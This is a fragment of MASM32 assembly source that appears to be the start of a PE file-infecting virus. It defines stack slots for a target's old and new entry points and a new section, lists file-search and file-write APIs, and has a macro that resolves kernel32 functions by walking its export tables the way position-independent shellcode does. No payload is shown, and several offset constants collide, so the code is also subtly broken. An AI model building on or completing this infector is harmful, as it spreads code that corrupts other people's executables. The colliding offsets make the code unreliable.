;include \Masm32\include\masm32rt.inc

.386
.model flat, stdcall
option casemap: none

; .const
	; Order of each variable IN THE STACK
	; Position relative to r|ebp calculated by -(Order * regSz)
    selfName EQU 11
	selfImageBaseAddress EQU 1
	selfSection EQU 2
	selfEntry EQU 3
	fileHand EQU 4 ; From FindFirstFile, for FindNextFile
	selfHand EQU 4
	tgHand EQU 5
	
	tgImageBaseAddress EQU 1
    tgOldEntry EQU 2
    tgNewSection EQU 3
	tgNewEntry EQU 4
	
    kernel32dll EQU 5
    OrdinalTbl EQU 6
    NamePtrTbl EQU 7
    AddrTbl EQU 8
    k32NumFunc EQU 9
    user32dll EQU 10
    
    ffind1 EQU 12 		; FindFirstFileA
    ffind2 EQU 13 		; FindNextFileA
    ffind0 EQU 14 		; FindClose
    fopen EQU 11 		; CreateFileA
    fseek EQU 17 		; SetFilePointer(Ex)
    fclose EQU 14 		; CloseHandle
    fread EQU 15 		; ReadFile
    fwrite EQU 16 		; WriteFile
    argv0 EQU 17
    loadlib EQU 17 		; LoadLibraryA
    getaddr EQU 18 		; GetProcAddress
    msgbox EQU 19 		; MessageBoxA
    
    stack_reserved EQU 10 ; Number of values to be stored in the stack
    regSz EQU 4 ; 8 for 64-bit

stackAddr MACRO pos:REQ
	LOCAL temp
	temp = - pos * regSz
	EXITM <temp>
ENDM

toStack MACRO pos:REQ, value:=<eax>
    mov [ebp + stackAddr(pos)], value
ENDM

fromStack MACRO pos:REQ
	EXITM <[ebp + stackAddr(pos)]>
ENDM

; MACRO for accessing data regions
; selfSection required
daccess MACRO pStr:REQ
	LOCAL address
	address = pStr - data_start + fromStack(selfSection)
	EXITM <address>
ENDM

k32import MACRO pFunc:REQ
	; Input the offset to a string that is the name of the queried function
	mov ebx, fromStack(kernel32dll)
	mov edx, fromStack(k32NumFunc)
	xor eax, eax
	
	loopback:
		mov edi, fromStack(NamePtrTbl)
		mov edi, [edi + eax*4]
		add edi, ebx
		mov esi, daccess(pFunc)
		cld ; DF = 0, ESI and EDI increments
		xor ecx, ecx
		add ecx, len(pFunc)
		cld
		repe cmpsb
	jz found
	
		inc eax
		cmp eax, edx
	jb loopback
	
	jmp old_entry
	
	found:
	mov edx, fromStack(OrdinalTbl)
	mov ax, [edx + eax * 2]
	mov edx, fromStack(AddrTbl)
	mov eax, [edx + eax * 4]
	mov edx, fromStack(kernel32dll)
	add eax, edx
	; eax now hold mem addr of function pointed to by pFunc
ENDM
	
	
